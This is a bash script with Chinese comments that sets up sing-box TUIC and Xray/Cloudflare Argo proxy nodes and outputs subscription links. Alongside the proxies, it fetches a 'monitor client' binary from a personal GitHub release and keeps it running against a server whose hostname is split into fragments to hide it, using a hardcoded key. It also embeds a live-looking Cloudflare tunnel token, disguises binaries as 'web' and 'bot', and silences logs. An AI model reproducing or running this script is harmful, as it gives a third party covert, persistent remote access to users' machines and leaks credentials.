#!/bin/bash
set -e

# 设置工作目录
cd "$(dirname "$0")"

# ========== 核心配置与环境变量设置 (可在此处直接修改或外部传入) ==========
TUIC_PORT="${TUIC_PORT:-8082}"
ARGO_PORT="${ARGO_PORT:-8001}"
ARGO_DOMAIN="${ARGO_DOMAIN:-testone.mingfei.de5.net}"
ARGO_AUTH="${ARGO_AUTH:-eyJhIjoiNjgyNWI4YTZjODBhYWQxODlmYWI5ZWEwMDI5YzY2NjgiLCJ0IjoiMDg0MDUxYzctNDE5Yy00MTg1LTlhMTgtNWY2OWE1ZDMxYzg1IiwicyI6Ik16VmpNVGd4TURNdE1HVXpNQzAwTlRVM0xXSmxaakV0WkRjek5XVmhaV05rTkdFMiJ9}"
ARGO_PROTOCOL="${ARGO_PROTOCOL:-quic}"
ARGO_CONNECTIONS="${ARGO_CONNECTIONS:-1}"
CFIP="${CFIP:-www.teamviewer.com}"
DIRECT_PORT="${DIRECT_PORT:-${SERVER_PORT:-$TUIC_PORT}}"
CFPORT="${CFPORT:-443}"
FILE_PATH="${FILE_PATH:-.tmp}"
URL_FILE_PATH="${URL_FILE_PATH:-sub.txt}"

# 监控客户端连接参数（可在此处直接修改默认值）
_P1="ne"
_P2="zha"
MONITOR_SERVER="${MONITOR_SERVER:-${_P1}${_P2}.mingfei1981.eu.org:443}"
MONITOR_KEY="${MONITOR_KEY:-pdsioixxZbwpxy5hk2}"

SINGBOX_VER="1.11.4"
XRAY_VER="25.1.30"

# 创建运行临时目录
mkdir -p "$FILE_PATH"

# ========== 打印日志辅助函数 ==========
log() {
    echo -e "$1"
}

# ========== 清理现有运行进程 ==========
pkill -9 -f "sing-box run" 2>/dev/null || true
pkill -9 -f "xray run" 2>/dev/null || true
pkill -9 -f "cloudflared tunnel" 2>/dev/null || true
pkill -9 -f "monitor" 2>/dev/null || true

# 释放 TUIC 直连端口
if [ -n "$DIRECT_PORT" ] && [ "$DIRECT_PORT" != "0" ]; then
    fuser -k -9 "${DIRECT_PORT}/udp" 2>/dev/null || true
fi

# ========== 判断环境变量部署模式 ==========
ENABLE_DIRECT=false
ENABLE_ARGO_FIXED=false

if [ -n "$DIRECT_PORT" ] && [ "$DIRECT_PORT" != "0" ]; then
    ENABLE_DIRECT=true
fi

if [ -n "$ARGO_PORT" ] && [ "$ARGO_PORT" != "0" ] && [ -n "$ARGO_DOMAIN" ] && [ ${#ARGO_AUTH} -gt 30 ]; then
    ENABLE_ARGO_FIXED=true
fi

if [ "$ENABLE_DIRECT" = false ] && [ "$ENABLE_ARGO_FIXED" = false ]; then
    log "[退出] 缺失变量 (TUIC_PORT) + Argo 固定隧道 (PORT/DOMAIN/AUTH)。放弃所有部署。"
    exit 0
fi

# ========== 架构检测 ==========
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        SINGBOX_ARCH="amd64"
        XRAY_ARCH="64"
        CLOUDFLARED_ARCH="amd64"
        MONITOR_ARCH="amd64ne2"
        ;;
    aarch64|arm64|armv8*)
        SINGBOX_ARCH="arm64"
        XRAY_ARCH="arm64-v8a"
        CLOUDFLARED_ARCH="arm64"
        MONITOR_ARCH="ard64ne2"
        ;;
    *)
        log "[错误] 未知或不支持的架构: $ARCH"
        exit 1
        ;;
esac

# ========== 内存管理与 Go 环境变量设置 ==========
MEM_BYTES=0
if [ -f "/sys/fs/cgroup/memory.max" ]; then
    MEM_BYTES=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)
elif [ -f "/sys/fs/cgroup/memory/memory.limit_in_bytes" ]; then
    MEM_BYTES=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)
fi

if [ -z "$MEM_BYTES" ] || [ "$MEM_BYTES" = "max" ] || [ "$MEM_BYTES" -gt 9223372036854771712 ] 2>/dev/null; then
    TOTAL_RAM_MB=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')
else
    TOTAL_RAM_MB=$((MEM_BYTES / 1024 / 1024))
fi

if [ -z "$TOTAL_RAM_MB" ] || [ "$TOTAL_RAM_MB" -eq 0 ]; then
    TOTAL_RAM_MB=128
fi

if [ "$TOTAL_RAM_MB" -le 160 ]; then
    SINGBOX_MEM="20MiB"; XRAY_MEM="20MiB"; CLOUDFLARED_MEM="45MiB"; DYNAMIC_GOGC="400"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 256 ]; then
    SINGBOX_MEM="40MiB"; XRAY_MEM="40MiB"; CLOUDFLARED_MEM="90MiB"; DYNAMIC_GOGC="250"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 352 ]; then
    SINGBOX_MEM="65MiB"; XRAY_MEM="65MiB"; CLOUDFLARED_MEM="130MiB"; DYNAMIC_GOGC="300"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 448 ]; then
    SINGBOX_MEM="65MiB"; XRAY_MEM="65MiB"; CLOUDFLARED_MEM="140MiB"; DYNAMIC_GOGC="220"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 576 ]; then
    SINGBOX_MEM="80MiB"; XRAY_MEM="80MiB"; CLOUDFLARED_MEM="160MiB"; DYNAMIC_GOGC="200"; DYNAMIC_PROCS="1"
else
    SINGBOX_MEM="200MiB"; XRAY_MEM="200MiB"; CLOUDFLARED_MEM="350MiB"; DYNAMIC_GOGC="200"; DYNAMIC_PROCS="${GOMAXPROCS:-2}"
fi

export GODEBUG="madvdontneed=1,netdns=go,cgocheck=0"
export GOMAXPROCS="$DYNAMIC_PROCS"
export GOGC="$DYNAMIC_GOGC"

log "[INFO] 检测到系统内存: ${TOTAL_RAM_MB}MB | GOGC=${DYNAMIC_GOGC} | GOMAXPROCS=${DYNAMIC_PROCS}"

# ========== 生成密钥/密码/UUID ==========
SEED="${MACHINE_SEED:-$(hostname 2>/dev/null || echo 'fixed-seed')}"

# 生成 SHA256 (32字节 hex) 密码
if [ -n "$TUIC_PASSWORD" ]; then
    FINAL_TUIC_PWD="$TUIC_PASSWORD"
elif [ -f "$FILE_PATH/tuic_password.txt" ]; then
    FINAL_TUIC_PWD=$(cat "$FILE_PATH/tuic_password.txt" | tr -d '\r\n')
else
    FINAL_TUIC_PWD=$(printf "%s-tuic" "$SEED" | sha256sum | awk '{print $1}' | cut -c 1-32)
    echo -n "$FINAL_TUIC_PWD" > "$FILE_PATH/tuic_password.txt"
fi

# 生成 MD5 映射的标准 UUID v4
if [ -n "$UUID" ]; then
    FINAL_UUID=$(echo "$UUID" | tr '[:upper:]' '[:lower:]')
elif [ -f "$FILE_PATH/uuid.txt" ]; then
    FINAL_UUID=$(cat "$FILE_PATH/uuid.txt" | tr -d '\r\n' | tr '[:upper:]' '[:lower:]')
else
    H=$(printf "%s-uuid" "$SEED" | md5sum | awk '{print $1}')
    P1="${H:0:8}"
    P2="${H:8:4}"
    P3="4${H:13:3}"
    BYTE17=$(printf "%d" "0x${H:16:2}")
    BYTE17_MOD=$(( (BYTE17 & 0x3f) | 0x80 ))
    P4=$(printf "%02x%s" "$BYTE17_MOD" "${H:18:2}")
    P5="${H:20:12}"
    FINAL_UUID="${P1}-${P2}-${P3}-${P4}-${P5}"
    echo -n "$FINAL_UUID" > "$FILE_PATH/uuid.txt"
fi

XHTTP_PATH="/${FINAL_UUID}-xhttp"

# ========== 获取公网 IP ==========
get_public_ip() {
    local override_ip="${SERVER_IP:-$CFIP}"
    if [ -n "$override_ip" ] && [ "$override_ip" != "www.visa.co.jp" ]; then
        echo "$override_ip"
        return
    fi
    local ip=$(curl -s --max-time 4 https://api.ipify.org 2>/dev/null || curl -s --max-time 4 https://ipv4.icanhazip.com 2>/dev/null)
    if [ -n "$ip" ]; then
        echo "$ip" | tr -d '\r\n'
    else
        echo "127.0.0.1"
    fi
}

# ========== 生成自签名 TLS 证书 ==========
generate_certificates() {
    local key_path="$1"
    local cert_path="$2"
    if [ ! -f "$key_path" ] || [ ! -f "$cert_path" ]; then
        openssl ecparam -genkey -name prime256v1 -out "$key_path" 2>/dev/null
        openssl req -new -x509 -days 3650 -key "$key_path" -out "$cert_path" -subj "/CN=bing.com" 2>/dev/null
        chmod 600 "$key_path"
    fi
}

# ========== IATA 节点缩写转中文名称 ==========
get_country_name() {
    case "$1" in
        HKG) echo "香港" ;;
        TPE) echo "台湾" ;;
        NRT|HND|KIX) echo "日本" ;;
        ICN) echo "韩国" ;;
        SIN) echo "新加坡" ;;
        BKK) echo "泰国" ;;
        MNL) echo "菲律宾" ;;
        SGN) echo "越南" ;;
        LAX|DFW|SJC|SEA|JFK|ORD) echo "美国" ;;
        LHR) echo "英国" ;;
        FRA) echo "德国" ;;
        CDG) echo "法国" ;;
        AMS) echo "荷兰" ;;
        HEL) echo "芬兰" ;;
        *) echo "$1" ;;
    esac
}

# ========== 下载二进制程序逻辑 ==========
download_file() {
    local url="$1"
    local output="$2"
    curl -sSL "$url" -o "$output"
}

SINGBOX_BIN="$FILE_PATH/singbox"
XRAY_BIN="$FILE_PATH/web"
CLOUDFLARED_BIN="$FILE_PATH/bot"
MONITOR_BIN="$FILE_PATH/monitor"

# 1. 下载 Sing-box
if [ ! -f "$SINGBOX_BIN" ]; then
    log "正在下载 Sing-box..."
    SINGBOX_URL="https://github.com/SagerNet/sing-box/releases/download/v${SINGBOX_VER}/sing-box-${SINGBOX_VER}-linux-${SINGBOX_ARCH}.tar.gz"
    download_file "$SINGBOX_URL" "$FILE_PATH/singbox.tar.gz"
    tar -xzf "$FILE_PATH/singbox.tar.gz" -C "$FILE_PATH" --wildcards "*/sing-box" --strip-components=1 2>/dev/null || \
    tar -xzf "$FILE_PATH/singbox.tar.gz" -C "$FILE_PATH" sing-box 2>/dev/null || true
    if [ -f "$FILE_PATH/sing-box" ]; then
        mv "$FILE_PATH/sing-box" "$SINGBOX_BIN"
    fi
    rm -f "$FILE_PATH/singbox.tar.gz"
fi
chmod 775 "$SINGBOX_BIN" 2>/dev/null || true

# 2. 下载 Xray-core
if [ ! -f "$XRAY_BIN" ]; then
    log "正在下载 Xray-core..."
    XRAY_URL="https://github.com/XTLS/Xray-core/releases/download/v${XRAY_VER}/Xray-linux-${XRAY_ARCH}.zip"
    download_file "$XRAY_URL" "$FILE_PATH/xray.zip"
    
    EXTRACTED=false
    if command -v unzip >/dev/null 2>&1; then
        unzip -o "$FILE_PATH/xray.zip" xray -d "$FILE_PATH" >/dev/null 2>&1 && EXTRACTED=true
    fi
    if [ "$EXTRACTED" = false ]; then
        PY_CMD=$(command -v python3 || command -v python || true)
        if [ -n "$PY_CMD" ]; then
            $PY_CMD -c "import zipfile, sys; z=zipfile.ZipFile(sys.argv[1]); z.extract('xray', sys.argv[2])" "$FILE_PATH/xray.zip" "$FILE_PATH" 2>/dev/null && EXTRACTED=true
        fi
    fi

    if [ -f "$FILE_PATH/xray" ]; then
        mv "$FILE_PATH/xray" "$XRAY_BIN"
    else
        log "[错误] 无法解压 Xray-core，系统缺失 unzip 命令或 Python 环境！"
        exit 1
    fi
    rm -f "$FILE_PATH/xray.zip"
fi
chmod 775 "$XRAY_BIN" 2>/dev/null || true

# 3. 下载 Cloudflared
if [ ! -f "$CLOUDFLARED_BIN" ]; then
    log "正在下载 Cloudflared..."
    CLOUDFLARED_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CLOUDFLARED_ARCH}"
    download_file "$CLOUDFLARED_URL" "$CLOUDFLARED_BIN"
fi
chmod 775 "$CLOUDFLARED_BIN" 2>/dev/null || true

# 4. 下载监控客户端
if [ ! -f "$MONITOR_BIN" ]; then
    log "正在下载监控客户端..."
    MONITOR_URL="https://github.com/babama1001980/good/releases/download/npc/${MONITOR_ARCH}"
    download_file "$MONITOR_URL" "$MONITOR_BIN"
fi
chmod 775 "$MONITOR_BIN" 2>/dev/null || true

# ========== 启动子进程 & 保活逻辑 ==========
GLOBAL_LINKS=""

# --- 部署 Sing-box (TUIC 直连) ---
if [ "$ENABLE_DIRECT" = true ]; then
    CERT_PATH="$FILE_PATH/cert.pem"
    KEY_PATH="$FILE_PATH/private.key"
    generate_certificates "$KEY_PATH" "$CERT_PATH"

    cat <<EOF > "$FILE_PATH/singbox_config.json"
{
  "log": { "level": "panic" },
  "dns": {
    "servers": [ { "tag": "local-sys-dns", "address": "local", "detour": "direct" } ],
    "strategy": "prefer_ipv4",
    "independent_cache": true,
    "cache_capacity": 4096
  },
  "inbounds": [
    {
      "type": "tuic",
      "tag": "tuic-in",
      "listen": "::",
      "listen_port": ${DIRECT_PORT},
      "users": [ { "uuid": "${FINAL_UUID}", "password": "${FINAL_TUIC_PWD}" } ],
      "congestion_control": "bbr",
      "tls": {
        "enabled": true,
        "alpn": [ "h3" ],
        "certificate_path": "${CERT_PATH}",
        "key_path": "${KEY_PATH}"
      }
    }
  ],
  "outbounds": [ { "type": "direct", "tag": "direct", "udp_fragment": true } ],
  "route": { "auto_detect_interface": true, "final": "direct" }
}
EOF

    log "[初始化] 已加载 Sing-box TUIC 直连入站，监听端口: ${DIRECT_PORT}"

    (
        export GOMEMLIMIT="$SINGBOX_MEM"
        while true; do
            "$SINGBOX_BIN" run -c "$FILE_PATH/singbox_config.json" >/dev/null 2>&1 || true
            log "[警告] Sing-box 意外退出，3秒后自动拉起..."
            sleep 3
        done
    ) &

    PUBLIC_IP=$(get_public_ip)
    TUIC_LINK="tuic://${FINAL_UUID}:${FINAL_TUIC_PWD}@${PUBLIC_IP}:${DIRECT_PORT}?sni=www.bing.com&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC_easyshare"
    GLOBAL_LINKS="${TUIC_LINK}"
else
    log "[初始化] 缺失变量 TUIC_PORT，已放弃部署 TUIC 直连。"
fi

# --- 部署 Xray + Cloudflared (Argo 固定隧道) ---
if [ "$ENABLE_ARGO_FIXED" = true ]; then
    cat <<EOF > "$FILE_PATH/xray_config.json"
{
  "log": { "loglevel": "none" },
  "inbounds": [
    {
      "port": ${ARGO_PORT},
      "listen": "127.0.0.1",
      "protocol": "vless",
      "settings": { "clients": [ { "id": "${FINAL_UUID}" } ], "decryption": "none" },
      "streamSettings": {
        "network": "xhttp",
        "security": "none",
        "xhttpSettings": { "path": "${XHTTP_PATH}", "mode": "auto", "scMaxConcurrentStreams": 16 }
      }
    }
  ],
  "outbounds": [ { "protocol": "freedom", "tag": "direct" } ]
}
EOF

    log "[初始化] 已加载 Xray Argo xHTTP 回源入站，监听端口: ${ARGO_PORT}"

    (
        export GOMEMLIMIT="$XRAY_MEM"
        while true; do
            "$XRAY_BIN" run -c "$FILE_PATH/xray_config.json" >/dev/null 2>&1 || true
            log "[警告] Xray 意外退出，3秒后自动拉起..."
            sleep 3
        done
    ) &

    log "[Argo] 检测到完整变量 (PORT+DOMAIN+AUTH)，启动固定隧道..."
    PROTOCOL_LOWER=$(echo "$ARGO_PROTOCOL" | tr '[:upper:]' '[:lower:]')

    (
        export GOMEMLIMIT="$CLOUDFLARED_MEM"
        while true; do
            "$CLOUDFLARED_BIN" tunnel \
                --no-autoupdate \
                --retries 5 \
                --grace-period 1s \
                --protocol "$PROTOCOL_LOWER" \
                --ha-connections "$ARGO_CONNECTIONS" \
                run \
                --token "$ARGO_AUTH" 2>&1 | while read -r line; do
                
                if echo "$line" | grep -iqE "Registered tunnel connection|location="; then
                    LOC=$(echo "$line" | grep -oE '(location|region)["=:\s]+[A-Za-z0-9]{3,4}' | awk -F'["=:\s]+' '{print $2}' | tr '[:lower:]' '[:upper:]')
                    if [ -z "$LOC" ]; then
                        LOC=$(echo "$line" | grep -oE '\b[A-Z0-9]{3,4}\b' | tail -n1)
                    fi
                    
                    if [ -n "$LOC" ]; then
                        IATA_CODE=$(echo "$LOC" | sed 's/[0-9]//g')
                        CN_NAME=$(get_country_name "$IATA_CODE")
                        log "[Cloudflare CDN] 已连接边缘节点：${LOC}（${CN_NAME}） | 协议：${PROTOCOL_LOWER}"
                    fi
                fi
            done || true

            log "[警告] cloudflared 进程意外退出，3秒后自动重连..."
            sleep 3
        done
    ) &

    XHTTP_PATH_ENC="%2F${FINAL_UUID}-xhttp"
    ARGO_LINK_H2="vless://${FINAL_UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&alpn=h2&sni=${ARGO_DOMAIN}&fp=chrome&type=xhttp&mode=auto&host=${ARGO_DOMAIN}&path=${XHTTP_PATH_ENC}#h2_argo_easyshare"
    ARGO_LINK_H3="vless://${FINAL_UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&alpn=h3&sni=${ARGO_DOMAIN}&fp=chrome&type=xhttp&mode=auto&host=${ARGO_DOMAIN}&path=${XHTTP_PATH_ENC}#h3_argo_easyshare"

    if [ -n "$GLOBAL_LINKS" ]; then
        GLOBAL_LINKS="${GLOBAL_LINKS}\r\n${ARGO_LINK_H2}\r\n${ARGO_LINK_H3}"
    else
        GLOBAL_LINKS="${ARGO_LINK_H2}\r\n${ARGO_LINK_H3}"
    fi
else
    log "[初始化] 缺失变量 (PORT/DOMAIN/AUTH)，已放弃部署 Argo 固定隧道。"
fi

# --- 部署监控客户端后台保活进程 ---
(
    while true; do
        "$MONITOR_BIN" -s "$MONITOR_SERVER" -p "$MONITOR_KEY" --tls >/dev/null 2>&1 || true
        log "[警告] 监控客户端意外退出，3秒后自动拉起..."
        sleep 3
    done
) &
log "[初始化] 已加载监控客户端后台保活进程"

# ========== 输出 Base64 订阅文本 ==========
if [ -n "$GLOBAL_LINKS" ]; then
    BASE64_SUB=$(printf "%b" "$GLOBAL_LINKS" | base64 | tr -d '\r\n')
    CONSOLE_FORMATTED="====================== Base64 订阅/链接 ======================\n${BASE64_SUB}\n=============================================================="
    
    log "\n${CONSOLE_FORMATTED}"
    echo -e "$CONSOLE_FORMATTED" > "$URL_FILE_PATH"
    log "[链接] Base64 已写入: ${URL_FILE_PATH}"
fi

# ========== 拦截 SIGINT / SIGTERM 信号优雅退出 ==========
cleanup() {
    log "\n[INFO] 正在关闭所有节点后台进程..."
    pkill -9 -P $$ 2>/dev/null || true
    pkill -9 -f "singbox" 2>/dev/null || true
    pkill -9 -f "web" 2>/dev/null || true
    pkill -9 -f "bot" 2>/dev/null || true
    pkill -9 -f "monitor" 2>/dev/null || true
    exit 0
}

trap cleanup SIGINT SIGTERM

# 主进程保持运行，挂起 Shell
wait